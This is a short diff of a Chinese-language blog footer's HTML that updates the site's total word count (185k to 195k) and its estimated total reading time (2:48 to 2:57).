       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">185k</span>
+    <span title="站点总字数">195k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:48</span>
+    <span title="站点阅读时长">2:57</span>
 </div>
 
 <!--
